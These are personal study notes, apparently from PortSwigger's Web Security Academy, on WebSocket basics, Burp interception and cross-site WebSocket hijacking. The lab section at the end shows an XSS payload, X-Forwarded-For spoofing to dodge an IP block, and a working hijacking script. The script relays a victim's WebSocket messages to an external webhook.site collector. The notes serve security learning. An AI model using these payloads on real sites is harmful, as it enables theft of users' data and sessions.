![[Pasted image 20231127221321.png]]
# What are WebSockets ? 
- they are bi-directional , initiated over HTTP , communication protocols ,used for streaming data and other asynchronous traffic . 

- ## HTTP vs WebSockets 
	- HTTP is the most used ( requests , responses) 
	- the HTTP request will be sent from the client and immediately the server will answer by a response (immediately) and here the process is finished 
	- in WebSockets (they are long live, bi-directional ,at any time not immediately ) the connection will normally stay open until  either the client or server send a msg . 
	-  WebSockets is more useful in situations like real-time responses because they are always listening . 

- ## How are WebSockets connections established ?
	- WebSockets connections are normally created using client-side JS like the following 
```javascript

var ws = new WebSocket("wss://normal-website.com/chat");
```
*.*
		- instead of HTTPS  for WebSockets it will be WSS and they both are encrypted using the TLS protocol  for there connections over the normal TCP connections . 
		- instead of HTTP for WebSockets it will be WS and they are both  not encrypted  and uses the TCP only  for there connections without any TLS for the encryption of the data transfer . 
		- to establish the WebSockets connection they both the  ( client and server ) => do a WebSocket handshake over HTTP (Requests and responses ) the browser issues a websocket  request like this : 
			- `GET /chat HTTP/1.1 Host: normal-website.com Sec-WebSocket-Version: 13 Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== Connection: keep-alive, Upgrade Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2 Upgrade: websocket`
		- and if the server accepts the Connection WebSockets handshake it will shake it back :) by sending the following response for example : 
				- `HTTP/1.1 101 Switching Protocols Connection: Upgrade Upgrade: websocket Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=`
		- and after that   the websocket  handshake will be done and from this point the connection is active and remains open they both client and server can msg each other and send websocket msgs  in either direction.
		- #### Note
			Several features of the WebSocket handshake messages are worth noting:
			- The `Connection` and `Upgrade` headers in the request and response indicate that this is a WebSocket handshake.
			- The `Sec-WebSocket-Version` request header specifies the WebSocket protocol version that the client wishes to use. This is typically `13`.
			- The `Sec-WebSocket-Key` request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
			- The `Sec-WebSocket-Accept` response header contains a hash of the value submitted in the `Sec-WebSocket-Key` request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.
- ## What do WebSocket msgs look like ?
	- we can send WebSocket msgs from our browser if the connection is active and open  via  the client-side JavaScript like the following: 
		`ws.send("hello, i am TheElJoyHunter");`
		- the form of the transfared data through the WebSockets connection can be alot of forms  from them is the  JSON (JSON is a data interchange format used for data representation and transmission, while JavaScript (JS) is a programming language used for creating dynamic behavior and interactivity on the web. JSON can be used with various programming languages, but JavaScript has a built-in capability to work with JSON due to its object notation similarity.) 
			`{"":"" , "":""}`
			`{"user":"TheElJoyHunter" , "content":"I am Joy who Destroy"}`
Developers : prefers to use Firebase because it is much more automated and  it is easier for them to be implemented not like the websockets that requires a manual connection handling .

| Consideration      | Firebase                                | WebSockets                              |
|-------------------- |----------------------------------------|-----------------------------------------|
| Ease of Use          | Provides a managed service, easy setup  | Requires more manual handling           |
| Flexibility          | Full-stack solution with less control  | Offers flexibility in implementation   |
| Scalability         | Automatic scaling                      | More control over server architecture   |
| Technology Stack   | All-in-one solution                     | Works with various tech stacks          |

---
# Manipulating WebSocket traffic ? 
![[Pasted image 20231127221321.png]]

- ## Intercepting and  modifying msgs: 
	- we will use burp interceptor as usual to intercept the websocket msgs.
- ## Replaying and generating new msgs:
	- using the burp repeater as usual to repeat sending the websocket msgs after modifying them over and over  and see how will they response msgs back . 
	- as we know that there is a history for the normal requests with how there responses , there is also a history called (websockets history ) that will contain all the websocket msgs that were sent in either direction  with how the other part responded . 
	- ![[Pasted image 20231128010037.png]]
- ## Manipulating  WebSocket Connections: 
	- it is just reestablishing the websocket connections .

---
# Exploiting WebSockets vulnerabilities ?

- ## Manipulating WebSocket msgs:
	- 
- ## Manipulating WebSocket handshake:
	- we just used  X-Forwarded-For: any_ip  for ex :  127.0.0.1 or 1.1.1.1
- ## Cross-site WebSocket hijacking
	- also known as _Cross Origin websocket hijacking_ 
	- it is just a mix between  (CSRF)  and  (WebSockets)
	- we find a CSRF -> inside the WebSocket  handshake. 
	- the cross site websocket hijacking happens when : the handshake depends only on the HTTP cookies for session handling and does not contain  any CSRF  tokens or other unpredictable values . 
	- what will attacker do ? 
		- the attacker (me) -> create malicious web page on my own domain 
		- my malicious web page will establish a websocket connection with the victim at its vulnerable website ( that we are attacking him in ) .
		- the result will be : we can get a two way interaction with the victim , and also we can read the cookies of the victim . 
		- - **Perform unauthorized actions masquerading as the victim user.** As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.
		- **Retrieve sensitive data that the user can access.** Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.
	- ### How to practically perform a cross site websocket hijacking : 
		- first step is to check if the  websocket handshake of the vulnerable application is actually vulnerable or not  ( does it contain  a csrf token  ? any unexpected values ? )
		- Vulnerable example (relies solely on the session in cookie   there is no other thing )
		  - `GET /chat HTTP/1.1 Host: normal-website.com Sec-WebSocket-Version: 13 Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== Connection: keep-alive, Upgrade Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2 Upgrade: websocket`
		- 
---
# Securing a WebSocket connection 

---
# _Labs solving 

### Manipulating WebSocket messages to exploit vulnerabilities

The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by [tampering with the contents of WebSocket messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages).

For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:

`{"message":"Hello Carlos"}`

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

`<td>Hello Carlos</td>`

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

`{"message":"<img src=1 onerror='alert(1)'>"}`

---
### Manipulating the WebSocket handshake to exploit vulnerabilities

Some WebSockets vulnerabilities can only be found and exploited by [manipulating the WebSocket handshake](https://portswigger.net/web-security/websockets#manipulating-websocket-connections). These vulnerabilities tend to involve design flaws, such as:

- Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.
- we used the x-forwarded-for: 1.1.1.1   -> this will lead  for us to be able to  bypass the blacklist IP restriction.

`<script> var ws = new WebSocket('wss://0a1000bf0464443a80c40d8a00e40072.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://webhook.site/4582921f-f016-4a02-a577-4b0a95f3ae26', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`